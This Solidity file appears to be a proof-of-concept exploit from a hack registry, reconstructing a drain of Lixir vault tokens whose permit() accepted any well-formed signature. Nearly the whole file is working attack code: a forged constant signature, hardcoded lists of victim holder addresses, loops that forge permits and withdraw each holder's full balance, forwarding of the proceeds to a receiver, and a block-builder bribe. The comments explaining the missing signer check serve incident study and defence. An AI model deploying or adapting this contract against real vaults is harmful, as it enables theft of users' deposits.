// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../interface.sol";

// @KeyInfo - Total Lost : 2.60 ETH, 4,477.72 USDC, 3,609.95 USDT, 24,182.56 LIX
// Attacker : 0x3Fa8cF7FeA68C8E76A9838d77889464DdFb6a6cf
// Attack Contract : 0xEFd1b12F5E3c35D7daE0D1449674C247566f9b76
// Vulnerable Contract : 0xfD4c9a491DD777b8b3e13659e9E379252eC78390; 0x49bba4C5C4F8a2D444Ca5fDA1b3137D94Df40465; 0xF4AF7Ae20EB7334Cbdf334EaF850e7DB42394839;
//                       0xC870d944Dd883f25a1b7B3312bc2449DD5B0267d; 0xF4aAda01bF9d44FE0D03a6b2Fa6519E3d7325556; 0xecC2b0296EaE113a114CcB9F8846A7852545DC58
// Attack Tx : https://etherscan.io/tx/0x17026faca0b8e4cb7531e4fb277c390eb165e81229628e0192923ad1d90a41da

// @Info
// Vulnerable Contract Code : NOT source-verified on Etherscan (both the proxy and
// the shared logic return UNVERIFIED). The permit() logic quoted in the writeup
// (evm-hack-registry/2026-06-LixirPermitDrain_exp/LixirPermitDrain_exp.md) is
// RECONSTRUCTED FROM THE -vvvvv TRACE, so this playground cannot show Lixir's own
// source for the vulnerable line - it renders as raw opcodes. The vulnerability
// locator below anchors on THIS contract's own forged-permit call site instead.

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2070362661691207935
//
// Lixir vault-token permits accepted a dummy signature as long as ecrecover returned a nonzero address.
// The attacker used the forged permit allowance to withdraw each holder's full vault-token balance.
//
// Standalone playground version: the real/registry PoC (test/LixirPermitDrain_exp.sol)
// runs the entire drain inside the LixirPermitDrain constructor via `new
// LixirPermitDrain(...)`, so the playground's recorder (which records ONE
// attackFunction call, not a deploy) can't step through it. This version is
// identical in every attack mechanic - same forged (v,r,s) constant, same vault
// list, same holder lists, same withdraw calls, same coinbase bribe - but moves
// the whole sequence out of the constructor into a plain external `attack()` so
// it can be deployed first and then recorded as the attackFunction call.
//
// No `vm.sign` / offline-signature derivation was needed here (unlike some other
// permit-forgery PoCs): the bug is that Lixir's permit() only checks
// `ecrecover(...) != address(0)`, never `== owner`. ecrecover returns SOME valid
// point on the curve for ANY well-formed (v in {27,28}, r, s) regardless of the
// digest, so the exact same constant (v=28, r, s) - lifted straight from the
// registry PoC/on-chain trace - satisfies the buggy check against every owner's
// digest without needing to correspond to any real signer's key at all.

address constant TOKEN_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant TOKEN_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant TOKEN_LIX = 0xd0345D30FD918D7682398ACbCdf139C808998709;

address constant LV_WETH_USDC_A = 0xfD4c9a491DD777b8b3e13659e9E379252eC78390;
address constant LV_LIX_WETH_A = 0x49bba4C5C4F8a2D444Ca5fDA1b3137D94Df40465;
address constant LV_WETH_USDC_B = 0xF4AF7Ae20EB7334Cbdf334EaF850e7DB42394839;
address constant LV_LIX_WETH_B = 0xC870d944Dd883f25a1b7B3312bc2449DD5B0267d;
address constant LV_USDC_USDT_A = 0xF4aAda01bF9d44FE0D03a6b2Fa6519E3d7325556;
address constant LV_USDC_USDT_B = 0xecC2b0296EaE113a114CcB9F8846A7852545DC58;

interface ILixirVaultToken {
    function balanceOf(
        address owner
    ) external view returns (uint256);
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function withdrawETHFrom(
        address owner,
        uint256 shares,
        uint256 minAmount0,
        uint256 minAmount1,
        address to,
        uint256 deadline
    ) external returns (uint256 amount0, uint256 amount1);
    function withdrawFrom(
        address owner,
        uint256 shares,
        uint256 minAmount0,
        uint256 minAmount1,
        address to,
        uint256 deadline
    ) external returns (uint256 amount0, uint256 amount1);
}

contract LixirPermitDrain {
    // Constant forged ECDSA signature. This is NOT signed by anyone - it is just
    // a well-formed (v, r, s) copied from the real attack tx. Because Lixir's
    // permit() never compares the recovered signer to `owner`, ANY well-formed
    // signature satisfies it for every victim's digest.
    uint8 private constant V = 28;
    bytes32 private constant R = 0xe7C93726a865578504442b1A6827f676E0ED74BDff2be3960d1e253bbcfc4462;
    bytes32 private constant S = 0x6AA772b878Bc912BdBB33a0014eC507c4B3896ea85aa914b74dee9b7ac3e56da;

    receive() external payable {}

    // Recorded entrypoint. Runs the exact same sequence the real constructor did:
    // forge a permit + withdraw against every known holder of all six vaults,
    // forward the loot to `receiver`, pay the block builder its bribe.
    function attack(
        address payable receiver
    ) external {
        // step 1: drain WETH-bearing vaults with forged permits, receiving unwrapped ETH plus ERC20 assets.
        _drainETHVault(LV_WETH_USDC_A, _lvWethUsdcAHolders());
        _drainETHVault(LV_LIX_WETH_A, _lvLixWethAHolders());
        _drainETHVault(LV_WETH_USDC_B, _lvWethUsdcBHolders());
        _drainETHVault(LV_LIX_WETH_B, _lvLixWethBHolders());

        // step 2: drain USDC-USDT vaults with the non-ETH withdraw function.
        _drainVault(LV_USDC_USDT_A, _lvUsdcUsdtAHolders());
        _drainVault(LV_USDC_USDT_B, _lvUsdcUsdtBHolders());

        // step 3: forward proceeds through the same receiver path observed in the trace.
        _safeTransferAll(TOKEN_USDC, receiver);
        _safeTransferAll(TOKEN_USDT, receiver);
        _safeTransferAll(TOKEN_LIX, receiver);

        (bool coinbasePaid,) = block.coinbase.call{value: 0.015 ether}("");
        require(coinbasePaid, "coinbase payment failed");

        (bool ethForwarded,) = receiver.call{value: address(this).balance}("");
        require(ethForwarded, "eth forwarding failed");
    }

    function _drainETHVault(
        address vault,
        address[] memory holders
    ) private {
        for (uint256 i = 0; i < holders.length; i++) {
            uint256 shares = ILixirVaultToken(vault).balanceOf(holders[i]);
            if (shares == 0) continue;

            // THE BUG: the vault's permit() only requires ecrecover(...) != address(0);
            // it never checks the recovered signer == `holders[i]`. This forged,
            // never-actually-signed-by-the-owner (v, r, s) is accepted anyway.
            ILixirVaultToken(vault).permit(holders[i], address(this), shares, type(uint256).max, V, R, S);
            ILixirVaultToken(vault).withdrawETHFrom(holders[i], shares, 0, 0, address(this), type(uint256).max);
        }
    }

    function _drainVault(
        address vault,
        address[] memory holders
    ) private {
        for (uint256 i = 0; i < holders.length; i++) {
            uint256 shares = ILixirVaultToken(vault).balanceOf(holders[i]);
            if (shares == 0) continue;

            ILixirVaultToken(vault).permit(holders[i], address(this), shares, type(uint256).max, V, R, S);
            ILixirVaultToken(vault).withdrawFrom(holders[i], shares, 0, 0, address(this), type(uint256).max);
        }
    }

    function _safeTransferAll(
        address token,
        address to
    ) private {
        uint256 amount = IERC20(token).balanceOf(address(this));
        if (amount == 0) return;

        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "token transfer failed");
    }

    function _lvWethUsdcAHolders() private pure returns (address[] memory holders) {
        holders = new address[](4);
        holders[0] = 0xD7078D619C99799E68E0b44119D6DA1C0367E43a;
        holders[1] = 0xD5Cb328f07a93BDcfbA6C701f2943F1B0B74f104;
        holders[2] = 0x4c25893dD19EBc94686A8745680457f69BCb2914;
        holders[3] = 0x9842654b567d3424fb07E1FDd18405530B3F9f5a;
    }

    function _lvLixWethAHolders() private pure returns (address[] memory holders) {
        holders = new address[](15);
        holders[0] = 0x63F75e8995c0A3B57FF5a2587BCd78D2fAF5D00D;
        holders[1] = 0x9953DA7f2161866afAAD3c844CaaeE35A262a001;
        holders[2] = 0x05AC4029c54A5622b6eF4114308CfCED60198AA3;
        holders[3] = 0xA0a06EE0418629A73FbFeBc355e48d345f5f60EF;
        holders[4] = 0x468B934CF48BB451B87EEa5654932C907F060EfE;
        holders[5] = 0x0564Ef02D9a6c0Cd54EA09a05d1075deFDb44A20;
        holders[6] = 0xA49FE5CB074F7f05EfB12c969BA5783fC8ef2Bfd;
        holders[7] = 0xb6f0439c1fcdBB9aaf64eEB9BD4F3140e95d1b5f;
        holders[8] = 0x1b1D046A1001fd6fd4d11f204c7464989d621D92;
        holders[9] = 0x929D696fEeb8cfBf823395ec2c01ef238C422Af1;
        holders[10] = 0x5229406Cbb785E7754BDD6af66b94263f1c7dAb7;
        holders[11] = 0xECA93a2B50f4819E602365fC51A295F755965b0F;
        holders[12] = 0x64Db074a4c1bd6ED38E2751Fc75A31C5f6AD4090;
        holders[13] = 0xb0487bdc8BE66895Eb1508062c73d14Bb18A88Ca;
        holders[14] = 0x71D8472C58D77F2220C333149BdF8b843C314E99;
    }

    function _lvWethUsdcBHolders() private pure returns (address[] memory holders) {
        holders = new address[](2);
        holders[0] = 0xC0Fbf0144763E822D7C6343151FD4F7383719637;
        holders[1] = 0xc341683d1Ee57b13Ab90a1FC00F38dC6F7aFdd14;
    }

    function _lvLixWethBHolders() private pure returns (address[] memory holders) {
        holders = new address[](18);
        holders[0] = 0xC0Fbf0144763E822D7C6343151FD4F7383719637;
        holders[1] = 0x4db4C33b3571C5402774790Eff5ca7763b6B792e;
        holders[2] = 0xb6f0439c1fcdBB9aaf64eEB9BD4F3140e95d1b5f;
        holders[3] = 0x929D696fEeb8cfBf823395ec2c01ef238C422Af1;
        holders[4] = 0x5229406Cbb785E7754BDD6af66b94263f1c7dAb7;
        holders[5] = 0xd07556cEB045DbDBD7d44955BcD4ccCCb5bFff47;
        holders[6] = 0x1b1D046A1001fd6fd4d11f204c7464989d621D92;
        holders[7] = 0xf68B10a37D1DdAe4278369d6aE25Ad0C6AF5Fc58;
        holders[8] = 0x184E2BC2087b97E59b6205150832471F1dA99223;
        holders[9] = 0x367f6d836962d4E9D92eD2165cF294f4DA78E4f6;
        holders[10] = 0xc92980D19E7399911f595053894408AD24380324;
        holders[11] = 0x759e7359D62F32f1899155193e2f43cD9058784c;
        holders[12] = 0x7d6D0764a87D435cFA49EdcA2A1a5571E40a2Ae4;
        holders[13] = 0x84912977B668E357198CaE78BA108B99Cff0489A;
        holders[14] = 0xCd57B34763ceF236505A505aD5e88133C23C3758;
        holders[15] = 0xd890B6F0551345B8146f66F8c329f70877c71119;
        holders[16] = 0xa150DA57fE14E1964164FD52b55759c2649c5E9A;
        holders[17] = 0x919f970311A92b6727765ad75533570AE4e8E1AC;
    }

    function _lvUsdcUsdtAHolders() private pure returns (address[] memory holders) {
        holders = new address[](1);
        holders[0] = 0xb4522eB2cA49963De9c3dC69023cBe6D53489C98;
    }

    function _lvUsdcUsdtBHolders() private pure returns (address[] memory holders) {
        holders = new address[](1);
        holders[0] = 0xC0Fbf0144763E822D7C6343151FD4F7383719637;
    }
}
